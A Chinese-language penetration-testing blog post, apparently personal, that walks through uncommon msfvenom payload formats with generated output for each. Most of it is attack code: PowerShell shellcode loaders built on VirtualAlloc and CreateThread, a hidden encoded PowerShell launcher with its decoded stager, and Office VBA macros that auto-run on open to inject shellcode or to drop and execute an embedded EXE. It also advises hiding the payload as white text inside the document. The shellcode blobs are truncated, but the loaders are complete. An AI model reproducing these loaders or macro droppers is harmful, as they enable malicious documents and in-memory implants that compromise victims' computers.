---
title: "MSFvenom 几种不常见的 Payload 格式"
date: 2019-07-29T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['metasploit','powershell']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

msfvenom 中一些不那么常见的 payload 格式.

<!--more-->

## powershell (ps1)

用来生成方便在 powershell 脚本中调用的 shellcode 变量.

```
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c......
```

调用方式请参考 `Invoke-Shellcode`. 

## psh-net

通过 c# 导入 win32api 执行 shellcode.

```
Set-StrictMode -Version 2
$fByu7 = @"
	using System;
	using System.Runtime.InteropServices;
	namespace hfn9 {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$q9qGo = New-Object Microsoft.CSharp.CSharpCodeProvider
$lumS = New-Object System.CodeDom.Compiler.CompilerParameters
$lumS.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$lumS.GenerateInMemory = $True
$fZR6 = $q9qGo.CompileAssemblyFromSource($lumS, $fByu7)

[Byte[]]$r5yy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL......")

$ew = [hfn9.func]::VirtualAlloc(0, $r5yy.Length + 1, [hfn9.func+AllocationType]::Reserve -bOr [hfn9.func+AllocationType]::Commit, [hfn9.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$ew) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($r5yy, 0, $ew, $r5yy.Length)
[IntPtr] $nbU = [hfn9.func]::CreateThread(0,0,$ew,0,0,0)
if ([Bool]!$nbU) { $global:result = 7; return }
$uT6h = [hfn9.func]::WaitForSingleObject($nbU, [hfn9.func+Time]::Infinite)
```

## psh-reflection

使用反射和委托执行 shellcode, 间接调用 win32api.

```
function hh {
	Param ($w9Nl, $jD_Z1)		
	$sJq = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $sJq.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($sJq.GetMethod('GetModuleHandle')).Invoke($null, @($w9Nl)))), $jD_Z1))
}

function rW {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $bJDR,
		[Parameter(Position = 1)] [Type] $oD0 = [Void]
	)
	
	$wa = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$wa.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $bJDR).SetImplementationFlags('Runtime, Managed')
	$wa.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $oD0, $bJDR).SetImplementationFlags('Runtime, Managed')
	
	return $wa.CreateType()
}

[Byte[]]$cb = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg......")
		
$srf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll VirtualAlloc), (rW @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cb.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($cb, 0, $srf, $cb.length)

$uC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll CreateThread), (rW @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$srf,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((hh kernel32.dll WaitForSingleObject), (rW @([IntPtr], [Int32]))).Invoke($uC,0xffffffff) | Out-Null
```

## psh-cmd

使用 `powershell -enc` 一键执行, 实质为将 shellcode 加载至内存, 然后创建进程.

```
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArA......
```

解码后的内容.

```
if([IntPtr]::Size -eq 4 {
    $b='powershell.exe'
} else {
    $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
};
$s=New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName=$b;
$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAMGUPl0CA7VWbW/aSBD+nEj5D1aFhK0QDIEmTaRKt+ad4sTEgUAoOm3stb2wtsl6DYG2//3G2E7Ta3LXnnQWL/syMzvzzDOzduLAEjQMJDEYZsr......''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);
```

## vba

调用 win32api 将 shellcode 加载至内存, 然后创建进程.

```
#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As LongPtr, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Foz As LongPtr, ByRef Jwgy As Any, ByVal Ave As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As Long, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Foz As Long, ByRef Jwgy As Any, ByVal Ave As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Pkwkdexzr As Long, Mcpo As Variant, Cggw As Long
#If Vba7 Then
	Dim  Ekfzpnfyt As LongPtr, Udtzjekhw As LongPtr
#Else
	Dim  Ekfzpnfyt As Long, Udtzjekhw As Long
#EndIf
	Mcpo = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183......)

	Ekfzpnfyt = VirtualAlloc(0, UBound(Mcpo), &H1000, &H40)
	For Cggw = LBound(Mcpo) To UBound(Mcpo)
		Pkwkdexzr = Mcpo(Cggw)
		Udtzjekhw = RtlMoveMemory(Ekfzpnfyt + Cggw, Pkwkdexzr, 1)
	Next Cggw
	Udtzjekhw = CreateThread(0, 0, Ekfzpnfyt, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub
```

## vba-exe

分为 loader 和 shellcode 两部分, 运行时 loader 将从 doc 文档内容里获取 shellcode, 然后保存为 exe 执行.

打开 doc 文档后将 payload 粘贴至文档末尾, 然后将字体颜色调为白色.

如果显示红色下划线就把 loader 和 payload 里的定位符 (这里是 Hmnywqavfc) 改成常用的单词.

```
'* loader

Sub Auto_Open()
	Cseed12
End Sub

Sub Cseed12()
	Dim Cseed7 As Integer
	Dim Cseed1 As String
	Dim Cseed2 As String
	Dim Cseed3 As Integer
	Dim Cseed4 As Paragraph
	Dim Cseed8 As Integer
	Dim Cseed9 As Boolean
	Dim Cseed5 As Integer
	Dim Cseed11 As String
	Dim Cseed6 As Byte
	Dim Hmnywqavfc as String
	Hmnywqavfc = "Hmnywqavfc"
	Cseed1 = "SqfibJKpmkMGwu.exe"
	Cseed2 = Environ("USERPROFILE")
	ChDrive (Cseed2)
	ChDir (Cseed2)
	Cseed3 = FreeFile()
	Open Cseed1 For Binary As Cseed3
	For Each Cseed4 in ActiveDocument.Paragraphs
		DoEvents
			Cseed11 = Cseed4.Range.Text
		If (Cseed9 = True) Then
			Cseed8 = 1
			While (Cseed8 < Len(Cseed11))
				Cseed6 = Mid(Cseed11,Cseed8,4)
				Put #Cseed3, , Cseed6
				Cseed8 = Cseed8 + 4
			Wend
		ElseIf (InStr(1,Cseed11,Hmnywqavfc) > 0 And Len(Cseed11) > 0) Then
			Cseed9 = True
		End If
	Next
	Close #Cseed3
	Cseed13(Cseed1)
End Sub

Sub Cseed13(Cseed10 As String)
	Dim Cseed7 As Integer
	Dim Cseed2 As String
	Cseed2 = Environ("USERPROFILE")
	ChDrive (Cseed2)
	ChDir (Cseed2)
	Cseed7 = Shell(Cseed10, vbHide)
End Sub

Sub AutoOpen()
	Auto_Open
End Sub

Sub Workbook_Open()
	Auto_Open
End Sub

'* payload

Hmnywqavfc
&H4D&H5A&H90&H00&H03&H00&H00&H00&H04&H00&H00&H00&HFF&HFF&H00&H00&HB8&H00&H00&H00&H00&H00&H00&H00&H40&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00&H00......
```

## vba-psh

调用 powershell 执行 shellcode.

```
Sub zfx88nq1O()
  Dim neqc
  neqc = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3A......"
  Call Shell(neqc, vbHide)
End Sub
Sub AutoOpen()
  zfx88nq1O
End Sub
Sub Workbook_Open()
  zfx88nq1O
End Sub
```